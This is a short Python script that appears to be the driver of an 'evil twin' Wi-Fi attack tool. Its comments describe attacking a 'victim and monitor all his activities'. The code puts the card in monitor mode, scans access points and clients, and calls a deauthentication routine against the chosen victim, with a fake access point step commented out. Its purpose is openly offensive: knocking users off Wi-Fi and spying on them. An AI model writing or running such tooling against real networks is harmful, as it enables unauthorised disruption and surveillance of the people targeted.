# attack victim and monitor all his activities

# sudo python3 attack.py

# detect the WLAN
"""
1. turn on monitor mode
2. scan
3. display all the WI-FI
4. let the user choose one WI-FI
5. display choosen WI-FI users
"""
# attack
"""
1. let the user choose wich one he wants to attack
2. Disconnect the victim from WI-FI (using deauthentication)
...
*. display victim's activities 
"""
# finish
"""
1. turn off monitor mode
"""

from scapy.all import *
from network import Network
from fake import Fake


def start_attack():
    print('start EVIL TWIN attack...')
    # if os.geteuid():
    #     sys.exit('need sudo permission')

    net_obj = Network()
    net_interface = net_obj.get_interface()
    # scanning for networks
    net_mac = net_obj.scanning_networks()
    # scanning for clients 
    cli_mac = net_obj.scanning_clients()

    fake_obj = Fake(net_interface, net_mac, cli_mac)
    # deauthentication
    fake_obj.deauthentication()
    # fake_ap
    # net_obj.fake_ap()

    net_obj.off()
    print('done')


if __name__ == '__main__':
    start_attack()